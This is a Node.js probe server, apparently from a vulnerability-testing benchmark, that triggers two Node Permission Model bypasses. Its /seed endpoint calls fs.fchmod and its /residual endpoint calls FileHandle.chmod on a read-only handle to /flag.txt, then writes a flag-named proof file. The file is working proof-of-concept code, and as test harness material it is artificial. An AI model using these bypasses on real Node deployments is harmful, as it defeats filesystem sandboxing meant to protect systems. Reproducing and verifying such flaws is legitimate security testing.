#!/usr/bin/env node
/**
 * PCB probe server for nodefs-cve-2026-21716 (CVE-2024-36137 -> CVE-2026-21716).
 *
 * Runs under Node's Permission Model with --allow-fs-write restricted to
 * /tmp/allowed. Two endpoints:
 *
 *   GET /health    readiness
 *   GET /seed      CVE-2024-36137: fs.fchmod on a read-only fd (callback API)
 *   GET /residual  CVE-2026-21716: fs.promises FileHandle.chmod (promises API)
 *
 * The entrypoint plants /flag.txt (PCB_FLAG, mode 0444). A successful chmod
 * bypass writes /tmp/allowed/<FLAG>.granted; the oracle lists /tmp/allowed via
 * docker exec (rce-oob).
 */
const http = require('http');
const fs = require('fs');

function granted(name) {
  // write proof into the ONLY allowed-write directory
  fs.writeFileSync('/tmp/allowed/' + name + '.granted', 'ok');
}

function serve(req, res) {
  const url = new URL(req.url, 'http://x');
  const respond = (code, obj) => {
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
  };
  if (url.pathname === '/health') return respond(200, { ok: true });

  if (url.pathname === '/seed') {
    fs.rmSync('/tmp/allowed', { recursive: true, force: true });
    fs.mkdirSync('/tmp/allowed');
    const flag = fs.readFileSync('/flag.txt', 'utf8').trim();
    fs.open('/flag.txt', 'r', (e, fd) => {
      if (e) return respond(200, { ok: false, err: e.message });
      fs.fchmod(fd, 0o666, e2 => {
        if (e2) return respond(200, { ok: false, err: e2.message });
        granted(flag);
        return respond(200, { ok: true, note: 'fchmod bypass' });
      });
    });
    return;
  }

  if (url.pathname === '/residual') {
    fs.rmSync('/tmp/allowed', { recursive: true, force: true });
    fs.mkdirSync('/tmp/allowed');
    const flag = fs.readFileSync('/flag.txt', 'utf8').trim();
    fs.promises.open('/flag.txt', 'r').then(fh =>
      fh.chmod(0o666).then(() => {
        granted(flag);
        return respond(200, { ok: true, note: 'FileHandle.chmod bypass' });
      }).catch(e => respond(200, { ok: false, err: e.message }))
    ).catch(e => respond(200, { ok: false, err: e.message }));
    return;
  }

  respond(404, { error: 'not found' });
}

http.createServer(serve).listen(3000, '0.0.0.0', () => {
  console.log('pcb nodefs probe listening on 3000');
});
